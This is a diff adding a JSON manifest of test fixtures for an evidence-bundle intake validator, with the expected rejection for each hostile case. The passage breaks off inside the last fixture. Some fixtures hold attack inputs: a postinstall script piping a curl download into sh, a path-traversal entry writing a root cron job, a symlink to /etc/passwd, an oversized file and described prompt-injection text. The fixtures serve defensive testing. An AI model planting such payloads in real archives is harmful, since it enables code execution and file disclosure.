@@ -1,0 +1,654 @@
+{
+  "manifest_version": "contract-fixtures/1.0.0",
+  "description": "Every public contract fixture, what single property it exercises, and for hostile fixtures the exact rejection an implementation must produce. The rejection is named as a stable code plus a JSON Pointer so 'rejected' and 'rejected for the right reason' are distinguishable; an implementation that rejects everything passes neither.",
+  "canonicalisation": {
+    "manifest_digest": "sha256 over the canonical JSON form of the bundle document with the manifest_digest member removed.",
+    "canonical_json": "json.dumps(payload, sort_keys=True, separators=(',', ':')) encoded UTF-8: sorted keys, no insignificant whitespace, non-ASCII escaped. The same convention as app.domain.schemas._Base.content_hash.",
+    "artifact_digest": "sha256 over the artifact's exact bytes.",
+    "jobspec_digest": "sha256 over the JobSpec bytes as Agent-workbench serialised them."
+  },
+  "materialisation": "Fixtures are JSON documents. Where a hostile property needs real bytes on disk -- traversal, symlink, oversize, an undeclared entry -- the bytes are described declaratively under each fixture's 'materialisation' key rather than committed. Building the archive is the intake workstream's job; contracts/README.md states exactly how.",
+  "fixtures": [
+    {
+      "fixture_id": "valid_single_attempt",
+      "file": "valid/single-attempt.json",
+      "category": "valid",
+      "schema": "schemas/evidence-intake-1.0.0.schema.json",
+      "property_exercised": "A complete, internally consistent bundle from one successful attempt.",
+      "expected_rejection": null,
+      "expected_rejection_reason": null,
+      "materialisation": {
+        "archive_root": "bundle/",
+        "jobspec_bytes": "{\"jobspec_format_version\":\"2.4.0\",\"job_id\":\"jb-2026-08-01-0007\",\"repository\":\"agent-workbench/fixture-repo\",\"task_kind\":\"bug_fix\"}",
+        "entries": [
+          {
+            "name": "candidate/ledger.py.diff",
+            "entry_type": "file",
+            "size_bytes": 279,
+            "sha256": "fd350fbddf54545c010c82376c8e39d41e20d46b0709a60f9e6314ad57515b56",
+            "content": "--- a/ledger.py\n+++ b/ledger.py\n@@ -17,6 +17,9 @@ def commit_effect(job_id: str) -> None:\n-    if not already_committed(job_id):\n-        write_effect(job_id)\n+    with effect_lock(job_id):\n+        if already_committed(job_id):\n+            return\n+        write_effect(job_id)\n"
+          },
+          {
+            "name": "evidence/visible-tests-initial.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "6abd6df359875cedb8874ca4502a97144fb918c687f01ad0f0c49d1f0cd03cf6",
+            "content": "{\"suite\":\"visible\",\"exit_code\":1,\"total\":12,\"passed\":10,\"failed\":2,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "evidence/visible-tests-final.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "f14a5edc62cf7939265f29628c5f55170a0a8f198204eed118f2ef4631e99708",
+            "content": "{\"suite\":\"visible\",\"exit_code\":0,\"total\":12,\"passed\":12,\"failed\":0,\"errors\":0,\"skipped\":0}"
+          }
+        ]
+      }
+    },
+    {
+      "fixture_id": "valid_bounded_retry",
+      "file": "valid/bounded-retry.json",
+      "category": "valid",
+      "schema": "schemas/evidence-intake-1.0.0.schema.json",
+      "property_exercised": "Attempt lineage with two declared retries inside the JobSpec retry budget.",
+      "expected_rejection": null,
+      "expected_rejection_reason": null,
+      "materialisation": {
+        "archive_root": "bundle/",
+        "jobspec_bytes": "{\"jobspec_format_version\":\"2.4.0\",\"job_id\":\"jb-2026-08-01-0007\",\"repository\":\"agent-workbench/fixture-repo\",\"task_kind\":\"bug_fix\"}",
+        "entries": [
+          {
+            "name": "candidate/ledger.py.diff",
+            "entry_type": "file",
+            "size_bytes": 279,
+            "sha256": "fd350fbddf54545c010c82376c8e39d41e20d46b0709a60f9e6314ad57515b56",
+            "content": "--- a/ledger.py\n+++ b/ledger.py\n@@ -17,6 +17,9 @@ def commit_effect(job_id: str) -> None:\n-    if not already_committed(job_id):\n-        write_effect(job_id)\n+    with effect_lock(job_id):\n+        if already_committed(job_id):\n+            return\n+        write_effect(job_id)\n"
+          },
+          {
+            "name": "evidence/visible-tests-initial.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "6abd6df359875cedb8874ca4502a97144fb918c687f01ad0f0c49d1f0cd03cf6",
+            "content": "{\"suite\":\"visible\",\"exit_code\":1,\"total\":12,\"passed\":10,\"failed\":2,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "evidence/visible-tests-final.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "f14a5edc62cf7939265f29628c5f55170a0a8f198204eed118f2ef4631e99708",
+            "content": "{\"suite\":\"visible\",\"exit_code\":0,\"total\":12,\"passed\":12,\"failed\":0,\"errors\":0,\"skipped\":0}"
+          }
+        ]
+      }
+    },
+    {
+      "fixture_id": "valid_failed_attempts",
+      "file": "valid/failed-attempts.json",
+      "category": "valid",
+      "schema": "schemas/evidence-intake-1.0.0.schema.json",
+      "property_exercised": "Every attempt failed. This is valid evidence of an unsuccessful job, not a malformed bundle, and intake must record it rather than reject it.",
+      "expected_rejection": null,
+      "expected_rejection_reason": null,
+      "materialisation": {
+        "archive_root": "bundle/",
+        "jobspec_bytes": "{\"jobspec_format_version\":\"2.4.0\",\"job_id\":\"jb-2026-08-01-0007\",\"repository\":\"agent-workbench/fixture-repo\",\"task_kind\":\"bug_fix\"}",
+        "entries": [
+          {
+            "name": "candidate/ledger.py.diff",
+            "entry_type": "file",
+            "size_bytes": 279,
+            "sha256": "fd350fbddf54545c010c82376c8e39d41e20d46b0709a60f9e6314ad57515b56",
+            "content": "--- a/ledger.py\n+++ b/ledger.py\n@@ -17,6 +17,9 @@ def commit_effect(job_id: str) -> None:\n-    if not already_committed(job_id):\n-        write_effect(job_id)\n+    with effect_lock(job_id):\n+        if already_committed(job_id):\n+            return\n+        write_effect(job_id)\n"
+          },
+          {
+            "name": "evidence/visible-tests-initial.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "6abd6df359875cedb8874ca4502a97144fb918c687f01ad0f0c49d1f0cd03cf6",
+            "content": "{\"suite\":\"visible\",\"exit_code\":1,\"total\":12,\"passed\":10,\"failed\":2,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "evidence/visible-tests-final.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "6abd6df359875cedb8874ca4502a97144fb918c687f01ad0f0c49d1f0cd03cf6",
+            "content": "{\"suite\":\"visible\",\"exit_code\":1,\"total\":12,\"passed\":10,\"failed\":2,\"errors\":0,\"skipped\":0}"
+          }
+        ]
+      }
+    },
+    {
+      "fixture_id": "hostile_incomplete_bundle",
+      "file": "hostile/incomplete-bundle.json",
+      "category": "hostile",
+      "schema": "schemas/evidence-intake-1.0.0.schema.json",
+      "property_exercised": "A required top-level section (provenance) is absent.",
+      "expected_rejection": {
+        "code": "required_property_missing",
+        "pointer": "",
+        "detail": "provenance"
+      },
+      "expected_rejection_reason": "Required property 'provenance' is missing at the document root; a bundle that omits a required part understates what is unproven.",
+      "materialisation": {
+        "archive_root": "bundle/",
+        "jobspec_bytes": "{\"jobspec_format_version\":\"2.4.0\",\"job_id\":\"jb-2026-08-01-0007\",\"repository\":\"agent-workbench/fixture-repo\",\"task_kind\":\"bug_fix\"}",
+        "entries": [
+          {
+            "name": "candidate/ledger.py.diff",
+            "entry_type": "file",
+            "size_bytes": 279,
+            "sha256": "fd350fbddf54545c010c82376c8e39d41e20d46b0709a60f9e6314ad57515b56",
+            "content": "--- a/ledger.py\n+++ b/ledger.py\n@@ -17,6 +17,9 @@ def commit_effect(job_id: str) -> None:\n-    if not already_committed(job_id):\n-        write_effect(job_id)\n+    with effect_lock(job_id):\n+        if already_committed(job_id):\n+            return\n+        write_effect(job_id)\n"
+          },
+          {
+            "name": "evidence/visible-tests-initial.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "6abd6df359875cedb8874ca4502a97144fb918c687f01ad0f0c49d1f0cd03cf6",
+            "content": "{\"suite\":\"visible\",\"exit_code\":1,\"total\":12,\"passed\":10,\"failed\":2,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "evidence/visible-tests-final.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "f14a5edc62cf7939265f29628c5f55170a0a8f198204eed118f2ef4631e99708",
+            "content": "{\"suite\":\"visible\",\"exit_code\":0,\"total\":12,\"passed\":12,\"failed\":0,\"errors\":0,\"skipped\":0}"
+          }
+        ]
+      }
+    },
+    {
+      "fixture_id": "hostile_wrong_jobspec_digest",
+      "file": "hostile/wrong-jobspec-digest.json",
+      "category": "hostile",
+      "schema": "schemas/evidence-intake-1.0.0.schema.json",
+      "property_exercised": "The declared JobSpec digest is not the digest of the JobSpec bytes.",
+      "expected_rejection": {
+        "code": "jobspec_digest_mismatch",
+        "pointer": "/jobspec_reference/jobspec_digest",
+        "detail": null
+      },
+      "expected_rejection_reason": "The recomputed sha256 of the JobSpec bytes does not equal jobspec_reference.jobspec_digest; the evidence describes a different job than the one being evaluated.",
+      "materialisation": {
+        "archive_root": "bundle/",
+        "jobspec_bytes": "{\"jobspec_format_version\":\"2.4.0\",\"job_id\":\"jb-2026-08-01-0007\",\"repository\":\"agent-workbench/fixture-repo\",\"task_kind\":\"bug_fix\"}",
+        "entries": [
+          {
+            "name": "candidate/ledger.py.diff",
+            "entry_type": "file",
+            "size_bytes": 279,
+            "sha256": "fd350fbddf54545c010c82376c8e39d41e20d46b0709a60f9e6314ad57515b56",
+            "content": "--- a/ledger.py\n+++ b/ledger.py\n@@ -17,6 +17,9 @@ def commit_effect(job_id: str) -> None:\n-    if not already_committed(job_id):\n-        write_effect(job_id)\n+    with effect_lock(job_id):\n+        if already_committed(job_id):\n+            return\n+        write_effect(job_id)\n"
+          },
+          {
+            "name": "evidence/visible-tests-initial.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "6abd6df359875cedb8874ca4502a97144fb918c687f01ad0f0c49d1f0cd03cf6",
+            "content": "{\"suite\":\"visible\",\"exit_code\":1,\"total\":12,\"passed\":10,\"failed\":2,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "evidence/visible-tests-final.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "f14a5edc62cf7939265f29628c5f55170a0a8f198204eed118f2ef4631e99708",
+            "content": "{\"suite\":\"visible\",\"exit_code\":0,\"total\":12,\"passed\":12,\"failed\":0,\"errors\":0,\"skipped\":0}"
+          }
+        ]
+      }
+    },
+    {
+      "fixture_id": "hostile_wrong_artifact_digest",
+      "file": "hostile/wrong-artifact-digest.json",
+      "category": "hostile",
+      "schema": "schemas/evidence-intake-1.0.0.schema.json",
+      "property_exercised": "A declared artifact digest is not the digest of the artifact's bytes.",
+      "expected_rejection": {
+        "code": "artifact_digest_mismatch",
+        "pointer": "/candidate_artifacts/0/sha256",
+        "detail": null
+      },
+      "expected_rejection_reason": "The recomputed sha256 of candidate_artifacts[0] does not equal its declared sha256; the artifact is not the one that was measured.",
+      "materialisation": {
+        "archive_root": "bundle/",
+        "jobspec_bytes": "{\"jobspec_format_version\":\"2.4.0\",\"job_id\":\"jb-2026-08-01-0007\",\"repository\":\"agent-workbench/fixture-repo\",\"task_kind\":\"bug_fix\"}",
+        "entries": [
+          {
+            "name": "candidate/ledger.py.diff",
+            "entry_type": "file",
+            "size_bytes": 279,
+            "sha256": "fd350fbddf54545c010c82376c8e39d41e20d46b0709a60f9e6314ad57515b56",
+            "content": "--- a/ledger.py\n+++ b/ledger.py\n@@ -17,6 +17,9 @@ def commit_effect(job_id: str) -> None:\n-    if not already_committed(job_id):\n-        write_effect(job_id)\n+    with effect_lock(job_id):\n+        if already_committed(job_id):\n+            return\n+        write_effect(job_id)\n"
+          },
+          {
+            "name": "evidence/visible-tests-initial.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "6abd6df359875cedb8874ca4502a97144fb918c687f01ad0f0c49d1f0cd03cf6",
+            "content": "{\"suite\":\"visible\",\"exit_code\":1,\"total\":12,\"passed\":10,\"failed\":2,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "evidence/visible-tests-final.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "f14a5edc62cf7939265f29628c5f55170a0a8f198204eed118f2ef4631e99708",
+            "content": "{\"suite\":\"visible\",\"exit_code\":0,\"total\":12,\"passed\":12,\"failed\":0,\"errors\":0,\"skipped\":0}"
+          }
+        ]
+      }
+    },
+    {
+      "fixture_id": "hostile_altered_after_hashing",
+      "file": "hostile/altered-after-hashing.json",
+      "category": "hostile",
+      "schema": "schemas/evidence-intake-1.0.0.schema.json",
+      "property_exercised": "The bundle was edited after its manifest digest was computed.",
+      "expected_rejection": {
+        "code": "manifest_digest_mismatch",
+        "pointer": "/manifest_digest",
+        "detail": null
+      },
+      "expected_rejection_reason": "The manifest digest recomputed over the document does not equal the recorded manifest_digest; provenance is broken and the bundle is not what was produced.",
+      "materialisation": {
+        "archive_root": "bundle/",
+        "jobspec_bytes": "{\"jobspec_format_version\":\"2.4.0\",\"job_id\":\"jb-2026-08-01-0007\",\"repository\":\"agent-workbench/fixture-repo\",\"task_kind\":\"bug_fix\"}",
+        "entries": [
+          {
+            "name": "candidate/ledger.py.diff",
+            "entry_type": "file",
+            "size_bytes": 279,
+            "sha256": "fd350fbddf54545c010c82376c8e39d41e20d46b0709a60f9e6314ad57515b56",
+            "content": "--- a/ledger.py\n+++ b/ledger.py\n@@ -17,6 +17,9 @@ def commit_effect(job_id: str) -> None:\n-    if not already_committed(job_id):\n-        write_effect(job_id)\n+    with effect_lock(job_id):\n+        if already_committed(job_id):\n+            return\n+        write_effect(job_id)\n"
+          },
+          {
+            "name": "evidence/visible-tests-initial.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "6abd6df359875cedb8874ca4502a97144fb918c687f01ad0f0c49d1f0cd03cf6",
+            "content": "{\"suite\":\"visible\",\"exit_code\":1,\"total\":12,\"passed\":10,\"failed\":2,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "evidence/visible-tests-final.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "f14a5edc62cf7939265f29628c5f55170a0a8f198204eed118f2ef4631e99708",
+            "content": "{\"suite\":\"visible\",\"exit_code\":0,\"total\":12,\"passed\":12,\"failed\":0,\"errors\":0,\"skipped\":0}"
+          }
+        ]
+      }
+    },
+    {
+      "fixture_id": "hostile_missing_initial_test_result",
+      "file": "hostile/missing-initial-test-result.json",
+      "category": "hostile",
+      "schema": "schemas/evidence-intake-1.0.0.schema.json",
+      "property_exercised": "The initial visible-test result is absent.",
+      "expected_rejection": {
+        "code": "required_property_missing",
+        "pointer": "/visible_test_results",
+        "detail": "initial"
+      },
+      "expected_rejection_reason": "Required property 'initial' is missing from visible_test_results; without a baseline, 'the tests pass' says nothing about what changed.",
+      "materialisation": {
+        "archive_root": "bundle/",
+        "jobspec_bytes": "{\"jobspec_format_version\":\"2.4.0\",\"job_id\":\"jb-2026-08-01-0007\",\"repository\":\"agent-workbench/fixture-repo\",\"task_kind\":\"bug_fix\"}",
+        "entries": [
+          {
+            "name": "candidate/ledger.py.diff",
+            "entry_type": "file",
+            "size_bytes": 279,
+            "sha256": "fd350fbddf54545c010c82376c8e39d41e20d46b0709a60f9e6314ad57515b56",
+            "content": "--- a/ledger.py\n+++ b/ledger.py\n@@ -17,6 +17,9 @@ def commit_effect(job_id: str) -> None:\n-    if not already_committed(job_id):\n-        write_effect(job_id)\n+    with effect_lock(job_id):\n+        if already_committed(job_id):\n+            return\n+        write_effect(job_id)\n"
+          },
+          {
+            "name": "evidence/visible-tests-initial.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "6abd6df359875cedb8874ca4502a97144fb918c687f01ad0f0c49d1f0cd03cf6",
+            "content": "{\"suite\":\"visible\",\"exit_code\":1,\"total\":12,\"passed\":10,\"failed\":2,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "evidence/visible-tests-final.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "f14a5edc62cf7939265f29628c5f55170a0a8f198204eed118f2ef4631e99708",
+            "content": "{\"suite\":\"visible\",\"exit_code\":0,\"total\":12,\"passed\":12,\"failed\":0,\"errors\":0,\"skipped\":0}"
+          }
+        ]
+      }
+    },
+    {
+      "fixture_id": "hostile_missing_final_test_result",
+      "file": "hostile/missing-final-test-result.json",
+      "category": "hostile",
+      "schema": "schemas/evidence-intake-1.0.0.schema.json",
+      "property_exercised": "The final visible-test result is absent.",
+      "expected_rejection": {
+        "code": "required_property_missing",
+        "pointer": "/visible_test_results",
+        "detail": "final"
+      },
+      "expected_rejection_reason": "Required property 'final' is missing from visible_test_results; there is nothing to compare the baseline against.",
+      "materialisation": {
+        "archive_root": "bundle/",
+        "jobspec_bytes": "{\"jobspec_format_version\":\"2.4.0\",\"job_id\":\"jb-2026-08-01-0007\",\"repository\":\"agent-workbench/fixture-repo\",\"task_kind\":\"bug_fix\"}",
+        "entries": [
+          {
+            "name": "candidate/ledger.py.diff",
+            "entry_type": "file",
+            "size_bytes": 279,
+            "sha256": "fd350fbddf54545c010c82376c8e39d41e20d46b0709a60f9e6314ad57515b56",
+            "content": "--- a/ledger.py\n+++ b/ledger.py\n@@ -17,6 +17,9 @@ def commit_effect(job_id: str) -> None:\n-    if not already_committed(job_id):\n-        write_effect(job_id)\n+    with effect_lock(job_id):\n+        if already_committed(job_id):\n+            return\n+        write_effect(job_id)\n"
+          },
+          {
+            "name": "evidence/visible-tests-initial.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "6abd6df359875cedb8874ca4502a97144fb918c687f01ad0f0c49d1f0cd03cf6",
+            "content": "{\"suite\":\"visible\",\"exit_code\":1,\"total\":12,\"passed\":10,\"failed\":2,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "evidence/visible-tests-final.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "f14a5edc62cf7939265f29628c5f55170a0a8f198204eed118f2ef4631e99708",
+            "content": "{\"suite\":\"visible\",\"exit_code\":0,\"total\":12,\"passed\":12,\"failed\":0,\"errors\":0,\"skipped\":0}"
+          }
+        ]
+      }
+    },
+    {
+      "fixture_id": "hostile_unexpected_extra_artifact",
+      "file": "hostile/unexpected-extra-artifact.json",
+      "category": "hostile",
+      "schema": "schemas/evidence-intake-1.0.0.schema.json",
+      "property_exercised": "The materialised bundle carries a file the document never declares.",
+      "expected_rejection": {
+        "code": "undeclared_archive_entry",
+        "pointer": "/candidate_artifacts",
+        "detail": "tools/postinstall.sh"
+      },
+      "expected_rejection_reason": "Archive entry 'tools/postinstall.sh' is present in the materialised bundle but absent from candidate_artifacts; an artifact nobody declared is an artifact nobody checked.",
+      "materialisation": {
+        "archive_root": "bundle/",
+        "jobspec_bytes": "{\"jobspec_format_version\":\"2.4.0\",\"job_id\":\"jb-2026-08-01-0007\",\"repository\":\"agent-workbench/fixture-repo\",\"task_kind\":\"bug_fix\"}",
+        "entries": [
+          {
+            "name": "candidate/ledger.py.diff",
+            "entry_type": "file",
+            "size_bytes": 279,
+            "sha256": "fd350fbddf54545c010c82376c8e39d41e20d46b0709a60f9e6314ad57515b56",
+            "content": "--- a/ledger.py\n+++ b/ledger.py\n@@ -17,6 +17,9 @@ def commit_effect(job_id: str) -> None:\n-    if not already_committed(job_id):\n-        write_effect(job_id)\n+    with effect_lock(job_id):\n+        if already_committed(job_id):\n+            return\n+        write_effect(job_id)\n"
+          },
+          {
+            "name": "evidence/visible-tests-initial.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "6abd6df359875cedb8874ca4502a97144fb918c687f01ad0f0c49d1f0cd03cf6",
+            "content": "{\"suite\":\"visible\",\"exit_code\":1,\"total\":12,\"passed\":10,\"failed\":2,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "evidence/visible-tests-final.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "f14a5edc62cf7939265f29628c5f55170a0a8f198204eed118f2ef4631e99708",
+            "content": "{\"suite\":\"visible\",\"exit_code\":0,\"total\":12,\"passed\":12,\"failed\":0,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "tools/postinstall.sh",
+            "entry_type": "file",
+            "size_bytes": 44,
+            "sha256": "e8544bd4f74e25fee3bb535b524d86dcb1b5e2a5107470276988b5b61364923c",
+            "content": "#!/bin/sh\ncurl -s http://127.0.0.1:9/x | sh\n"
+          }
+        ],
+        "note": "The archive carries an entry the bundle never declares. Nothing in the document is wrong on its own; the bundle and its contents disagree."
+      }
+    },
+    {
+      "fixture_id": "hostile_path_traversal",
+      "file": "hostile/path-traversal.json",
+      "category": "hostile",
+      "schema": "schemas/evidence-intake-1.0.0.schema.json",
+      "property_exercised": "A declared artifact path escapes the extraction root with '..' segments.",
+      "expected_rejection": {
+        "code": "pattern_mismatch",
+        "pointer": "/candidate_artifacts/3/path",
+        "detail": null
+      },
+      "expected_rejection_reason": "candidate_artifacts[3].path does not match the safe-relative-path pattern; extraction would write outside the workspace.",
+      "materialisation": {
+        "archive_root": "bundle/",
+        "jobspec_bytes": "{\"jobspec_format_version\":\"2.4.0\",\"job_id\":\"jb-2026-08-01-0007\",\"repository\":\"agent-workbench/fixture-repo\",\"task_kind\":\"bug_fix\"}",
+        "entries": [
+          {
+            "name": "candidate/ledger.py.diff",
+            "entry_type": "file",
+            "size_bytes": 279,
+            "sha256": "fd350fbddf54545c010c82376c8e39d41e20d46b0709a60f9e6314ad57515b56",
+            "content": "--- a/ledger.py\n+++ b/ledger.py\n@@ -17,6 +17,9 @@ def commit_effect(job_id: str) -> None:\n-    if not already_committed(job_id):\n-        write_effect(job_id)\n+    with effect_lock(job_id):\n+        if already_committed(job_id):\n+            return\n+        write_effect(job_id)\n"
+          },
+          {
+            "name": "evidence/visible-tests-initial.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "6abd6df359875cedb8874ca4502a97144fb918c687f01ad0f0c49d1f0cd03cf6",
+            "content": "{\"suite\":\"visible\",\"exit_code\":1,\"total\":12,\"passed\":10,\"failed\":2,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "evidence/visible-tests-final.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "f14a5edc62cf7939265f29628c5f55170a0a8f198204eed118f2ef4631e99708",
+            "content": "{\"suite\":\"visible\",\"exit_code\":0,\"total\":12,\"passed\":12,\"failed\":0,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "../../../etc/cron.d/agent-workbench",
+            "entry_type": "file",
+            "size_bytes": 27,
+            "sha256": "b16f9a7f667ad8e5410fde0a8db4292e6f5983df4d58500ff8b50cc7a5ac1959",
+            "content": "* * * * * root /usr/bin/id\n"
+          }
+        ],
+        "note": "Declared path escapes the extraction root. Materialise by writing the archive entry under this literal name -- do not normalise it, or the fixture stops testing anything."
+      }
+    },
+    {
+      "fixture_id": "hostile_symlink_escape",
+      "file": "hostile/symlink-escape.json",
+      "category": "hostile",
+      "schema": "schemas/evidence-intake-1.0.0.schema.json",
+      "property_exercised": "An archive entry declared as a regular file is a symlink pointing outside the bundle.",
+      "expected_rejection": {
+        "code": "symlink_archive_entry_refused",
+        "pointer": "/candidate_artifacts/3/path",
+        "detail": "/etc/passwd"
+      },
+      "expected_rejection_reason": "Archive entry 'evidence/host-passwd.txt' is a symlink to '/etc/passwd'; only regular files are declarable, and following it would read outside the bundle.",
+      "materialisation": {
+        "archive_root": "bundle/",
+        "jobspec_bytes": "{\"jobspec_format_version\":\"2.4.0\",\"job_id\":\"jb-2026-08-01-0007\",\"repository\":\"agent-workbench/fixture-repo\",\"task_kind\":\"bug_fix\"}",
+        "entries": [
+          {
+            "name": "candidate/ledger.py.diff",
+            "entry_type": "file",
+            "size_bytes": 279,
+            "sha256": "fd350fbddf54545c010c82376c8e39d41e20d46b0709a60f9e6314ad57515b56",
+            "content": "--- a/ledger.py\n+++ b/ledger.py\n@@ -17,6 +17,9 @@ def commit_effect(job_id: str) -> None:\n-    if not already_committed(job_id):\n-        write_effect(job_id)\n+    with effect_lock(job_id):\n+        if already_committed(job_id):\n+            return\n+        write_effect(job_id)\n"
+          },
+          {
+            "name": "evidence/visible-tests-initial.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "6abd6df359875cedb8874ca4502a97144fb918c687f01ad0f0c49d1f0cd03cf6",
+            "content": "{\"suite\":\"visible\",\"exit_code\":1,\"total\":12,\"passed\":10,\"failed\":2,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "evidence/visible-tests-final.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "f14a5edc62cf7939265f29628c5f55170a0a8f198204eed118f2ef4631e99708",
+            "content": "{\"suite\":\"visible\",\"exit_code\":0,\"total\":12,\"passed\":12,\"failed\":0,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "evidence/host-passwd.txt",
+            "entry_type": "symlink",
+            "link_target": "/etc/passwd",
+            "size_bytes": 11,
+            "sha256": "74acf31844532670be412c65b8251ee55d072549080b1cffdbea6b1a192230a0"
+          }
+        ],
+        "note": "The document declares a regular file; the archive entry is a symlink out of the bundle. The declaration alone is clean, so this is only detectable against the materialised archive."
+      }
+    },
+    {
+      "fixture_id": "hostile_oversized_evidence",
+      "file": "hostile/oversized-evidence.json",
+      "category": "hostile",
+      "schema": "schemas/evidence-intake-1.0.0.schema.json",
+      "property_exercised": "A declared artifact exceeds the per-artifact byte ceiling.",
+      "expected_rejection": {
+        "code": "value_out_of_range",
+        "pointer": "/candidate_artifacts/3/size_bytes",
+        "detail": null
+      },
+      "expected_rejection_reason": "candidate_artifacts[3].size_bytes exceeds the 1048576-byte ceiling; an unbounded bundle is an unbounded read and a denial-of-service vector.",
+      "materialisation": {
+        "archive_root": "bundle/",
+        "jobspec_bytes": "{\"jobspec_format_version\":\"2.4.0\",\"job_id\":\"jb-2026-08-01-0007\",\"repository\":\"agent-workbench/fixture-repo\",\"task_kind\":\"bug_fix\"}",
+        "entries": [
+          {
+            "name": "candidate/ledger.py.diff",
+            "entry_type": "file",
+            "size_bytes": 279,
+            "sha256": "fd350fbddf54545c010c82376c8e39d41e20d46b0709a60f9e6314ad57515b56",
+            "content": "--- a/ledger.py\n+++ b/ledger.py\n@@ -17,6 +17,9 @@ def commit_effect(job_id: str) -> None:\n-    if not already_committed(job_id):\n-        write_effect(job_id)\n+    with effect_lock(job_id):\n+        if already_committed(job_id):\n+            return\n+        write_effect(job_id)\n"
+          },
+          {
+            "name": "evidence/visible-tests-initial.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "6abd6df359875cedb8874ca4502a97144fb918c687f01ad0f0c49d1f0cd03cf6",
+            "content": "{\"suite\":\"visible\",\"exit_code\":1,\"total\":12,\"passed\":10,\"failed\":2,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "evidence/visible-tests-final.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "f14a5edc62cf7939265f29628c5f55170a0a8f198204eed118f2ef4631e99708",
+            "content": "{\"suite\":\"visible\",\"exit_code\":0,\"total\":12,\"passed\":12,\"failed\":0,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "evidence/agent-session.log",
+            "entry_type": "file",
+            "size_bytes": 2147483648,
+            "sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+            "generate": {
+              "kind": "repeated_byte",
+              "byte": 65,
+              "count": 2147483648
+            }
+          }
+        ],
+        "note": "No 2 GiB file is committed. Materialise by generating the declared number of bytes at extraction time; the recorded sha256 is a placeholder because the size ceiling is refused before anything is read."
+      }
+    },
+    {
+      "fixture_id": "hostile_reviewer_and_model_text",
+      "file": "hostile/hostile-model-reviewer-text.json",
+      "category": "hostile",
+      "schema": "schemas/evidence-intake-1.0.0.schema.json",
+      "property_exercised": "Narrative text carrying prompt injection, template and shell injection, a traversal string, a forged verifier verdict, a NUL byte and a right-to-left override.",
+      "expected_rejection": {
+        "code": "pattern_mismatch",
+        "pointer": "/narrative/reviewer_note",
+        "detail": null
+      },
+      "expected_rejection_reason": "narrative.reviewer_note contains characters outside the permitted set (a U+0000 NUL and a U+202E right-to-left override); text that cannot be shown faithfully to a human reviewer is refused at the boundary. The injection strings themselves are retained, not filtered -- they are recorded evidence with no authority over control flow.",
+      "materialisation": {
+        "archive_root": "bundle/",
+        "jobspec_bytes": "{\"jobspec_format_version\":\"2.4.0\",\"job_id\":\"jb-2026-08-01-0007\",\"repository\":\"agent-workbench/fixture-repo\",\"task_kind\":\"bug_fix\"}",
+        "entries": [
+          {
+            "name": "candidate/ledger.py.diff",
+            "entry_type": "file",
+            "size_bytes": 279,
+            "sha256": "fd350fbddf54545c010c82376c8e39d41e20d46b0709a60f9e6314ad57515b56",
+            "content": "--- a/ledger.py\n+++ b/ledger.py\n@@ -17,6 +17,9 @@ def commit_effect(job_id: str) -> None:\n-    if not already_committed(job_id):\n-        write_effect(job_id)\n+    with effect_lock(job_id):\n+        if already_committed(job_id):\n+            return\n+        write_effect(job_id)\n"
+          },
+          {
+            "name": "evidence/visible-tests-initial.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "6abd6df359875cedb8874ca4502a97144fb918c687f01ad0f0c49d1f0cd03cf6",
+            "content": "{\"suite\":\"visible\",\"exit_code\":1,\"total\":12,\"passed\":10,\"failed\":2,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "evidence/visible-tests-final.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "f14a5edc62cf7939265f29628c5f55170a0a8f198204eed118f2ef4631e99708",
